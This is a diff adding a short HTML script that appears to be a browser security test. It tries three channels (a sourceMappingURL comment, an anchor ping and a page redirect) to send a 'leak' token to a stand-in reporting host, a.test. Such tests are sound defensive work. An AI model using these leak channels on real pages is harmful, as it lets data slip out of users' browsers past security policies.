@@ -1,0 +1,16 @@
+<script>
+  // Attempt to exploit sourceMapping by redirecting to a reporting endpoint
+  document.write(
+    `<script>//# sourceMappingURL=https://a.test/report/?leak=c661126-sourceMapping<\/script>`
+  );
+
+  // Use <a ping> feature to send a request on anchor tag click
+  const a = document.createElement('a');
+  a.href = '#';
+  a.ping = 'https://a.test/report/?leak=c661126-ping';
+  document.body.appendChild(a);
+  a.click();
+
+  // HTTP 204 status redirection to the reporting endpoint
+  location = `https://a.test/report/?leak=c661126-204`;
+</script>
